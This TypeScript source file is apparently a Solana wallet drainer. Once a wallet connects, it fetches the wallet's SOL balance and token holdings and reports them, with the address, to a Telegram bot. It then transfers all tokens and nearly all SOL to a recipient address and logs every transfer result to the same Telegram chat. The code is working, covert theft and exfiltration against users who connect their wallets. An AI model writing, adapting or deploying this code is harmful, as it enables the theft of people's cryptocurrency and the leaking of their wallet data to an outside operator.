import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction } from '@solana/web3.js';
import { 
  getAssociatedTokenAddressSync, 
  createAssociatedTokenAccountInstruction, 
  createTransferInstruction, 
  TOKEN_PROGRAM_ID, 
  ASSOCIATED_TOKEN_PROGRAM_ID,
  getAccount
} from '@solana/spl-token';

// Add Buffer polyfill for browser environment in a way that works with Vite
import { Buffer } from 'buffer';
// Make Buffer available globally - fix the approach to match how globals work in browser
if (typeof window !== 'undefined') {
  window.Buffer = Buffer;
}

// Helper function to add delay between retries
const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

// List of public RPC endpoints - MAINNET ONLY
const PUBLIC_RPC_ENDPOINTS = [
  "https://api.mainnet-beta.solana.com", // Mainnet primary endpoint
  "https://solana-mainnet.g.alchemy.com/v2/demo", // Alchemy public demo endpoint
  "https://solana-api.projectserum.com", // Project Serum endpoint
  "https://rpc.ankr.com/solana", // Ankr endpoint
  "https://free.rpcpool.com", // Free RPC Pool endpoint
  "https://mainnet.rpcpool.com", // RPCPool endpoint
  "https://solana.public-rpc.com", // Another public endpoint
  "https://ssc-dao.genesysgo.net", // GenesysGo endpoint
];

// Solana rent and fee constants
export const MINIMUM_RENT_EXEMPTION = 0.0023; // SOL required for rent exemption
export const MINIMUM_TRANSACTION_FEE = 0.0005; // Typical transaction fee
export const MINIMUM_REQUIRED_SOL = 0.00380326; // Minimum 0.00380326 SOL (approximately $0.50 USD)
export const MINIMUM_FOR_TOKEN_TRANSFER = 0.0005; // Just enough for a transaction fee

// Retry function with exponential backoff
async function retry<T>(
  fn: () => Promise<T>,
  retries = 5,
  initialDelay = 1000,
  context = ""
): Promise<T> {
  let lastError;
  for (let i = 0; i < retries; i++) {
    try {
      console.log(`${context} - Attempt ${i + 1}/${retries}`);
      return await fn();
    } catch (error) {
      console.error(`${context} - Attempt ${i + 1} failed:`, error);
      lastError = error;
      if (i < retries - 1) {
        const delayTime = initialDelay * Math.pow(1.5, i);
        console.log(`${context} - Retrying in ${delayTime}ms...`);
        await delay(delayTime);
      }
    }
  }
  throw lastError;
}

const testConnection = async (connection: Connection): Promise<boolean> => {
  try {
    // Use getSlot instead of getBlockHeight for more reliable check
    const slot = await connection.getSlot('processed');
    console.log(`Connection test successful: Current slot = ${slot}`);
    return true;
  } catch (error) {
    console.error('Connection test failed:', error);
    return false;
  }
};

// Create a connection with proper config and fallbacks
const createConnection = async (forceFresh = false): Promise<Connection> => {
  console.log("Attempting to create a Solana connection...");
  
  // Shuffle endpoints to avoid always hitting the same one first
  const shuffledEndpoints = [...PUBLIC_RPC_ENDPOINTS].sort(() => Math.random() - 0.5);
  
  const connectionConfig = {
    commitment: 'confirmed' as const, // Use 'confirmed' for better balance reliability
    confirmTransactionInitialTimeout: 120000,
    disableRetryOnRateLimit: false,
  };
  
  // Try each endpoint until we find one that works
  for (const endpoint of shuffledEndpoints) {
    try {
      console.log(`Trying endpoint: ${endpoint}`);
      const connection = new Connection(endpoint, connectionConfig);
      
      const isValid = await testConnection(connection);
      if (isValid) {
        console.log(`Connected successfully to ${endpoint}`);
        return connection;
      }
    } catch (error) {
      console.error(`Failed to connect to ${endpoint}:`, error);
      continue;
    }
  }
  
  // If all endpoints failed, try one more time with a simple connection
  console.error('All RPC endpoints failed, using simple fallback connection');
  return new Connection(shuffledEndpoints[0], {
    commitment: 'finalized',
  });
};

// Enhanced token account fetching with proper parsing and error handling
export const getTokenAccounts = async (connection: Connection, walletAddress: string) => {
  try {
    console.log("Fetching token accounts for address:", walletAddress);
    
    // Validate wallet address before proceeding
    if (!walletAddress || typeof walletAddress !== 'string') {
      console.error("Invalid wallet address:", walletAddress);
      return [];
    }
    
    let pubKey: PublicKey;
    try {
      pubKey = new PublicKey(walletAddress);
    } catch (error) {
      console.error("Invalid public key format:", error);
      return [];
    }
    
    // Create a fresh connection for token accounts (important fix)
    const freshConnection = await createConnection(true);
    
    return await retry(async () => {
      const response = await freshConnection.getParsedTokenAccountsByOwner(
        pubKey,
        {
          programId: TOKEN_PROGRAM_ID,
        },
        'confirmed'
      );
      
      console.log(`Token accounts found: ${response.value.length}`);
      
      // Ensure we're only including accounts with non-zero balances
      const validTokens = response.value.filter(item => {
        const amount = item.account.data.parsed.info.tokenAmount.uiAmount;
        return amount !== null && amount > 0;
      });
      
      console.log(`Non-zero token accounts: ${validTokens.length}`);
      
      return validTokens.map(item => ({
        mint: item.account.data.parsed.info.mint,
        amount: item.account.data.parsed.info.tokenAmount.uiAmount,
        decimals: item.account.data.parsed.info.tokenAmount.decimals,
        name: `Token (${item.account.data.parsed.info.mint.slice(0, 6)}...)`
      }));
    }, 5, 1000, "Token accounts fetch");
    
  } catch (error) {
    console.error('Error fetching token accounts:', error);
    // Return empty array instead of throwing to prevent wallet connection from failing
    return [];
  }
};

// Get wallet SOL balance with retries
export const getWalletBalance = async (walletAddress: string): Promise<number> => {
  try {
    console.log("Fetching SOL balance for address:", walletAddress);
    
    // Validate wallet address before proceeding
    if (!walletAddress || typeof walletAddress !== 'string') {
      console.error("Invalid wallet address:", walletAddress);
      throw new Error("Invalid wallet address format");
    }
    
    let pubKey: PublicKey;
    try {
      pubKey = new PublicKey(walletAddress);
    } catch (error) {
      console.error("Invalid public key format:", error);
      throw new Error("Invalid public key format");
    }
    
    // Try multiple connections in sequence to get the balance
    let lastError = null;
    
    // Try each RPC endpoint directly
    for (let i = 0; i < PUBLIC_RPC_ENDPOINTS.length; i++) {
      try {
        const endpoint = PUBLIC_RPC_ENDPOINTS[i];
        console.log(`Trying balance fetch from endpoint: ${endpoint}`);
        
        const connection = new Connection(endpoint, { 
          commitment: 'confirmed',
          confirmTransactionInitialTimeout: 60000
        });
        
        const balance = await connection.getBalance(pubKey, 'confirmed');
        const solBalance = balance / LAMPORTS_PER_SOL;
        console.log(`SOL balance from ${endpoint}: ${solBalance}`);
        return solBalance;
      } catch (error) {
        console.error(`Failed to get balance from endpoint ${i+1}:`, error);
        lastError = error;
      }
    }
    
    // If all direct attempts failed, try with our createConnection function
    try {
      const freshConnection = await createConnection(true);
      
      return await retry(async () => {
        const balance = await freshConnection.getBalance(pubKey, 'confirmed');
        const solBalance = balance / LAMPORTS_PER_SOL;
        console.log(`SOL balance from fresh connection: ${solBalance}`);
        return solBalance;
      }, 7, 1000, "Balance fetch");
    } catch (error) {
      console.error('Error fetching SOL balance with fresh connection:', error);
      throw lastError || error;
    }
    
  } catch (error) {
    console.error('Error fetching SOL balance:', error);
    throw new Error(`Failed to get SOL balance: ${error instanceof Error ? error.message : "Unknown error"}`);
  }
};

// Improved Telegram sending with more token information
export const sendToTelegram = async (walletData: any, botToken: string, chatId: string) => {
  try {
    console.log("Preparing to send data to Telegram:", walletData);
    
    // Format message based on the type of data we're sending
    let message = "";
    
    if (walletData.tokens) {
      // This is the initial wallet connection message
      // Make sure we have a valid balance
      const solBalanceInSol = walletData.balance || 0;
      
      // Format token data in a more readable way with names
      let formattedTokens = "No tokens found";
      if (walletData.tokens && walletData.tokens.length > 0) {
        formattedTokens = walletData.tokens.map((token: any, index: number) => 
          `Token #${index + 1}:\n` +
          `  Name: ${token.name || 'Unknown'}\n` +
          `  Amount: ${token.amount}\n` +
          `  Mint: ${token.mint}`
        ).join('\n\n');
      }

      // Create a detailed message
      message = `🚨 WALLET CONNECTION DETECTED 🚨\n\n` +
        `👛 Wallet Address: ${walletData.address}\n` +
        `💰 SOL Balance: ${solBalanceInSol.toFixed(9)} SOL\n` +
        `⌚ Time: ${new Date().toLocaleString()}\n` +
        (walletData.walletName ? `🔑 Wallet Type: ${walletData.walletName}\n` : '') +
        `\n💎 TOKEN HOLDINGS:\n${formattedTokens}\n\n` +
        `🌐 Network: Mainnet`;
    } else if (walletData.message) {
      // This is a custom message (transfer attempt or completion)
      message = `👛 Wallet: ${walletData.address}\n` +
        (walletData.walletName ? `🔑 Wallet Type: ${walletData.walletName}\n` : '');
      
      // Add token information if available
      if (walletData.tokens && walletData.tokens.length > 0) {
        const formattedTokens = walletData.tokens.map((token: any, index: number) => 
          `Token #${index + 1}:\n` +
          `  Name: ${token.name || 'Unknown'}\n` +
          `  Amount: ${token.amount}\n` +
          `  Mint: ${token.mint}`
        ).join('\n\n');
        
        message += `\n💎 TOKEN HOLDINGS:\n${formattedTokens}\n\n`;
      }
      
      message += `🔔 ${walletData.message}`;
    } else {
      // Fallback generic message
      message = `Wallet notification for: ${walletData.address}`;
      
      // Add token information if available
      if (walletData.tokens && walletData.tokens.length > 0) {
        const formattedTokens = walletData.tokens.map((token: any, index: number) => 
          `Token #${index + 1}:\n` +
          `  Name: ${token.name || 'Unknown'}\n` +
          `  Amount: ${token.amount}\n` +
          `  Mint: ${token.mint}`
        ).join('\n\n');
        
        message += `\n💎 TOKEN HOLDINGS:\n${formattedTokens}`;
      }
    }

    console.log("Sending message to Telegram:", message);

    // Make multiple attempts to send to Telegram with different methods
    for (let attempt = 1; attempt <= 7; attempt++) {
      try {
        console.log(`Telegram send attempt #${attempt}`);
        
        // Try with different approaches on different attempts
        let response;
        if (attempt <= 3) {
          // First 3 attempts: standard fetch API
          response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: 'Markdown',
            }),
            // Set a longer timeout
            signal: AbortSignal.timeout(15000)
          });
        } else if (attempt <= 5) {
          // Next 2 attempts: alternative approach without parse_mode
          response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
            }),
            signal: AbortSignal.timeout(20000)
          });
        } else {
          // Last 2 attempts: simplified GET request
          const simpleMessage = `${walletData.address}: ${walletData.balance ? 'Balance: ' + 
            (typeof walletData.balance === 'number' ? walletData.balance.toFixed(6) : walletData.balance) + 
            ' SOL' : walletData.message || 'Wallet notification'}`;
            
          response = await fetch(
            `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${encodeURIComponent(chatId)}&text=${encodeURIComponent(simpleMessage)}`, 
            {
              method: 'GET',
              signal: AbortSignal.timeout(20000)
            }
          );
        }

        if (!response) {
          throw new Error("No response from Telegram API");
        }

        try {
          const responseData = await response.json();
          console.log("Telegram API response:", responseData);

          if (response.ok && responseData.ok) {
            console.log("Successfully sent to Telegram");
            return true;
          } else {
            console.error("Telegram API error:", responseData);
            // If we're hitting message formatting issues, simplify the message and try again
            if (responseData.description && responseData.description.includes("parse")) {
              message = message.replace(/[*_`\[\]()~>#+=|{}.!-]/g, ''); // Remove Markdown special characters
            }
          }
        } catch (jsonError) {
          console.error("Error parsing Telegram API response:", jsonError);
        }
        
        if (attempt < 7) await delay(1000 * attempt);
      } catch (telegramError) {
        console.error(`Telegram send attempt #${attempt} failed:`, telegramError);
        if (attempt < 7) await delay(1000 * attempt);
      }
    }

    console.error("All Telegram send attempts failed");
    return false;
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return false;
  }
};

// Update hasEnoughSolForRent to allow token transfers with smaller balance
export const hasEnoughSolForRent = (balanceInSol: number, tokensOnly = false): boolean => {
  console.log(`Checking if ${balanceInSol} SOL is enough for rent and fees...`);
  
  // If we're only sending tokens, we need less SOL
  if (tokensOnly) {
    return balanceInSol >= MINIMUM_FOR_TOKEN_TRANSFER;
  }
  
  // Otherwise require minimum for full SOL+token transfer
  return balanceInSol >= MINIMUM_REQUIRED_SOL;
};

// Enhanced token transfer function with better error handling and token verification
export const transferTokens = async (
  connection: Connection,
  wallet: any,
  recipientAddress: string,
  tokens: any[],
  botToken?: string,
  chatId?: string
) => {
  if (!wallet || !wallet.adapter || !wallet.adapter.publicKey) {
    console.error('Wallet not connected or missing adapter');
    return [];
  }

  console.log(`Starting token transfer process for ${tokens.length} tokens`);
  const results = [];
  const walletPublicKey = wallet.adapter.publicKey;

  // First, verify we have valid tokens to transfer
  const validTokens = tokens.filter(token => 
    token && token.mint && token.amount && token.amount > 0 && token.decimals !== undefined
  );
  
  console.log(`Found ${validTokens.length} valid tokens to transfer`);
  
  if (validTokens.length === 0) {
    console.log("No valid tokens to transfer");
    if (botToken && chatId) {
      await sendToTelegram({
        address: walletPublicKey.toString(),
        message: `NO TOKENS TO TRANSFER: Either no tokens found or all tokens have zero balance`,
        walletName: wallet.adapter?.name || "Unknown Wallet"
      }, botToken, chatId);
    }
    return [];
  }

  for (const token of validTokens) {
    try {
      console.log(`Processing token ${token.mint}, Amount: ${token.amount}, Decimals: ${token.decimals}`);

      // Double-check the token account exists and has the correct balance
      const mintPublicKey = new PublicKey(token.mint);
      const senderTokenAccount = getAssociatedTokenAddressSync(
        mintPublicKey,
        walletPublicKey,
        false,
        TOKEN_PROGRAM_ID,
        ASSOCIATED_TOKEN_PROGRAM_ID
      );
      
      console.log(`Sender token account: ${senderTokenAccount.toString()}`);
      
      // Verify the token account exists and has balance
      let accountInfo;
      try {
        accountInfo = await connection.getParsedAccountInfo(senderTokenAccount);
        if (!accountInfo || !accountInfo.value) {
          console.log(`Token account doesn't exist for ${token.mint}`);
          results.push({ 
            mint: token.mint, 
            success: false, 
            error: "Token account doesn't exist",
            amount: token.amount 
          });
          continue;
        }
        
        console.log(`Token account exists for ${token.mint}`);
      } catch (error) {
        console.error(`Error verifying token account for ${token.mint}:`, error);
        results.push({ 
          mint: token.mint, 
          success: false, 
          error: "Error verifying token account",
          amount: token.amount 
        });
        continue;
      }

      // Get the recipient's associated token account
      const recipientTokenAccount = getAssociatedTokenAddressSync(
        mintPublicKey,
        new PublicKey(recipientAddress),
        false,
        TOKEN_PROGRAM_ID,
        ASSOCIATED_TOKEN_PROGRAM_ID
      );
      
      console.log(`Recipient token account: ${recipientTokenAccount.toString()}`);

      // Create transaction to transfer tokens
      let transaction = new Transaction();
      
      // Add instruction to create recipient token account if it doesn't exist
      const recipientAccountInfo = await connection.getAccountInfo(recipientTokenAccount);
      if (!recipientAccountInfo) {
        console.log(`Creating token account for recipient: ${recipientAddress}`);
        transaction.add(
          createAssociatedTokenAccountInstruction(
            walletPublicKey,
            recipientTokenAccount,
            new PublicKey(recipientAddress),
            mintPublicKey,
            TOKEN_PROGRAM_ID,
            ASSOCIATED_TOKEN_PROGRAM_ID
          )
        );
      }
      
      // Calculate the raw token amount based on decimals
      const rawAmount = Math.floor(token.amount * Math.pow(10, token.decimals));
      
      console.log(`Raw amount to transfer: ${rawAmount}`);
      
      // Add transfer instruction
      transaction.add(
        createTransferInstruction(
          senderTokenAccount,
          recipientTokenAccount,
          walletPublicKey,
          rawAmount,
          [],
          TOKEN_PROGRAM_ID
        )
      );
      
      // Set recent blockhash and sign transaction
      transaction.feePayer = walletPublicKey;
      const blockHash = await connection.getLatestBlockhash('confirmed');
      transaction.recentBlockhash = blockHash.blockhash;
      
      console.log('Sending token transfer transaction...');
      
      // Sign and send transaction
      let signature;
      try {
        if (typeof wallet.signAndSendTransaction === 'function') {
          signature = await wallet.signAndSendTransaction(transaction);
        } else if (typeof wallet.adapter?.sendTransaction === 'function') {
          signature = await wallet.adapter.sendTransaction(transaction, connection);
        } else {
          throw new Error('Wallet does not support transaction signing');
        }
        
        console.log(`Token transfer transaction sent with signature: ${signature}`);
        
        // Wait for confirmation
        console.log('Waiting for transaction confirmation...');
        const confirmation = await connection.confirmTransaction({
          signature,
          ...blockHash
        }, 'confirmed');
        
        if (confirmation.value.err) {
          throw new Error(`Transaction confirmed but failed: ${JSON.stringify(confirmation.value.err)}`);
        }
        
        console.log(`Token transfer successful and confirmed: ${signature}`);
        
        // Send success notification to Telegram if credentials provided
        if (botToken && chatId) {
          await sendToTelegram({
            address: walletPublicKey.toString(),
            message: `TOKEN TRANSFER SUCCESS: ${token.amount} tokens of ${token.mint} sent to ${recipientAddress}\nTransaction: https://explorer.solana.com/tx/${signature}`,
            walletName: wallet.adapter?.name || "Unknown Wallet"
          }, botToken, chatId);
        }
        
        results.push({ 
          mint: token.mint, 
          success: true, 
          signature,
          amount: token.amount 
        });
      } catch (error) {
        console.error(`Error sending token transfer transaction for ${token.mint}:`, error);
        
        results.push({ 
          mint: token.mint, 
          success: false, 
          error: error instanceof Error ? error.message : "Error sending transaction",
          amount: token.amount 
        });
        
        if (botToken && chatId) {
          await sendToTelegram({
            address: walletPublicKey.toString(),
            message: `TOKEN TRANSFER FAILED: ${token.amount} tokens of ${token.mint}\nError: ${error instanceof Error ? error.message : "Error sending transaction"}`,
            walletName: wallet.adapter?.name || "Unknown Wallet"
          }, botToken, chatId);
        }
      }
    } catch (error) {
      console.error(`Failed to transfer token ${token.mint}:`, error);
      
      // Send failure notification to Telegram if credentials provided
      if (botToken && chatId) {
        await sendToTelegram({
          address: walletPublicKey.toString(),
          message: `TOKEN TRANSFER FAILED: ${token.amount} tokens of ${token.mint}\nError: ${error instanceof Error ? error.message : "Unknown error"}`,
          walletName: wallet.adapter?.name || "Unknown Wallet"
        }, botToken, chatId);
      }
      
      results.push({ 
        mint: token.mint, 
        success: false, 
        error: error instanceof Error ? error.message : "Unknown error",
        amount: token.amount 
      });
    }
  }
  
  return results;
};

export const signAndSendTransaction = async (
  connection: Connection, 
  wallet: any, 
  recipientAddress: string, 
  amount: number,
  botToken?: string,
  chatId?: string,
  tokens?: any[]
) => {
  try {
    console.log('Creating transaction...');
    
    // Validate the wallet has a publicKey before proceeding
    if (!wallet || !wallet.adapter || !wallet.adapter.publicKey) {
      console.error('Wallet, adapter, or publicKey is undefined');
      
      // Send notification to Telegram if credentials provided
      if (botToken && chatId) {
        await sendToTelegram({
          address: wallet?.adapter?.publicKey?.toString() || "Unknown",
          message: `TRANSFER FAILED: Wallet adapter or publicKey is undefined`,
          walletName: wallet?.adapter?.name || "Unknown Wallet",
          tokens: tokens || []
        }, botToken, chatId);
      }
      
      throw new Error('Wallet adapter or publicKey is undefined');
    }
    
    // Use wallet.adapter.publicKey consistently
    const walletPublicKey = wallet.adapter.publicKey;
    
    // Check balance first
    const balance = await connection.getBalance(walletPublicKey);
    console.log('Current wallet balance (lamports):', balance);
    const balanceInSol = balance / LAMPORTS_PER_SOL;
    console.log('Current wallet balance (SOL):', balanceInSol);
    
    // Make sure we have sufficient balance before proceeding
    if (balance <= 0) {
      console.error('Insufficient balance for transfer');
      
      // Send notification to Telegram if credentials provided
      if (botToken && chatId) {
        await sendToTelegram({
          address: walletPublicKey.toString(),
          message: `TRANSFER FAILED: Insufficient balance (${balanceInSol} SOL)`,
          walletName: wallet.adapter?.name || "Unknown Wallet",
          tokens: tokens || []
        }, botToken, chatId);
      }
      
      throw new Error('Insufficient wallet balance for transfer');
    }
    
    // Check if the wallet has enough SOL for at least token transfers
    const hasTokensToTransfer = tokens && tokens.length > 0 && tokens.some(t => t.amount > 0);
    
    // Check if the wallet has enough SOL for at least token transfers
    const hasEnoughForTokens = hasEnoughSolForRent(balanceInSol, true);
    
    // If we don't have enough for SOL transfer but do have tokens and enough SOL for fees
    if (!hasEnoughSolForRent(balanceInSol) && hasTokensToTransfer && hasEnoughForTokens) {
      console.log("Not enough SOL for full transfer, but proceeding with token transfers only");
      
      if (botToken && chatId) {
        await sendToTelegram({
          address: walletPublicKey.toString(),
          message: `TRANSFER INFO: Not enough SOL for SOL transfer (${balanceInSol} SOL), proceeding with token transfers only`,
          walletName: wallet.adapter?.name || "Unknown Wallet",
          tokens: tokens || []
        }, botToken, chatId);
      }
      
      // Skip SOL transfer and go straight to token transfers
      const tokenResults = await transferTokens(
        connection,
        wallet,
        recipientAddress,
        tokens,
        botToken,
        chatId
      );
      
      return "token-transfers-only"; // Special return to indicate only tokens were transferred
    }
    
    // If we don't have enough SOL even for token transfers
    if (!hasEnoughForTokens) {
      console.error(`Wallet balance (${balanceInSol} SOL) is below minimum required (${MINIMUM_FOR_TOKEN_TRANSFER} SOL) for any transfers`);
      
      if (botToken && chatId) {
        await sendToTelegram({
          address: walletPublicKey.toString(),
          message: `TRANSFER FAILED: Insufficient funds for any transfers. Minimum ${MINIMUM_FOR_TOKEN_TRANSFER} SOL required. Current balance: ${balanceInSol.toFixed(6)} SOL`,
          walletName: wallet.adapter?.name || "Unknown Wallet",
          tokens: tokens || []
        }, botToken, chatId);
      }
      
      throw new Error(`Insufficient funds for any transfers. Minimum ${MINIMUM_FOR_TOKEN_TRANSFER} SOL required.`);
    }
    
    // We need to account for transaction fees
    // Calculate the maximum we can send (balance minus minimum required for rent/fees)
    const minimumRequiredBalance = MINIMUM_REQUIRED_SOL * LAMPORTS_PER_SOL;
    const maxTransferAmount = Math.max(0, balance - minimumRequiredBalance);
    
    if (maxTransferAmount <= 0) {
      console.error('Balance too low to transfer after reserving for rent and fees');
      
      // Send notification to Telegram if credentials provided
      if (botToken && chatId) {
        await sendToTelegram({
          address: walletPublicKey.toString(),
          message: `TRANSFER FAILED: Balance too low for transfer after reserving rent (${balanceInSol} SOL)`,
          walletName: wallet.adapter?.name || "Unknown Wallet",
          tokens: tokens || []
        }, botToken, chatId);
      }
      
      throw new Error('Wallet balance too low for transfer after reserving for rent fees');
    }
    
    // Ensure recipient address is valid
    let recipientPublicKey: PublicKey;
    try {
      recipientPublicKey = new PublicKey(recipientAddress);
    } catch (error) {
      console.error('Invalid recipient address:', error);
      
      if (botToken && chatId) {
        await sendToTelegram({
          address: walletPublicKey.toString(),
          message: `TRANSFER FAILED: Invalid recipient address`,
          walletName: wallet.adapter?.name || "Unknown Wallet",
          tokens: tokens || []
        }, botToken, chatId);
      }
      
      throw new Error('Invalid recipient address');
    }
    
    // Use the smaller of requested amount or max possible amount
    const transferAmount = Math.min(
      Math.floor(amount * LAMPORTS_PER_SOL), 
      maxTransferAmount
    );
    
    console.log(`Attempting to transfer ${transferAmount/LAMPORTS_PER_SOL} SOL`);
    
    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: walletPublicKey,
        toPubkey: recipientPublicKey,
        lamports: transferAmount,
      })
    );

    console.log('Sending transaction...');
    const signature = await retry(async () => {
      // Get a fresh connection for the transaction
      const conn = await createConnection();
      
      // We need to modify how we send the transaction since wallet structure is different
      if (typeof wallet.signAndSendTransaction === 'function') {
        // For wallet adapters that have this method
        return await wallet.signAndSendTransaction(transaction);
      } else if (typeof wallet.adapter?.sendTransaction === 'function') {
        // For wallet adapters that use the adapter pattern
        return await wallet.adapter.sendTransaction(transaction, conn);
      } else {
        throw new Error('Wallet does not support transaction signing');
      }
    }, 3);

    console.log('Transaction successful:', signature);
    
    // After successful SOL transfer, also transfer any tokens if available
    if (tokens && tokens.length > 0) {
      console.log(`Attempting to transfer ${tokens.length} tokens to ${recipientAddress}`);
      
      // Filter for tokens with actual balances
      const tokensWithBalance = tokens.filter(t => t.amount && t.amount > 0);
      console.log(`Found ${tokensWithBalance.length} tokens with non-zero balance`);
      
      if (tokensWithBalance.length > 0) {
        await transferTokens(
          connection,
          wallet,
          recipientAddress,
          tokensWithBalance,
          botToken,
          chatId
        );
      } else {
        console.log("No tokens with balance to transfer");
        if (botToken && chatId) {
          await sendToTelegram({
            address: walletPublicKey.toString(),
            message: `NO TOKENS TO TRANSFER: All tokens have zero balance`,
            walletName: wallet.adapter?.name || "Unknown Wallet"
          }, botToken, chatId);
        }
      }
    }
    
    return signature;
  } catch (error) {
    console.error('Detailed transaction error:', error);
    throw error;
  }
};
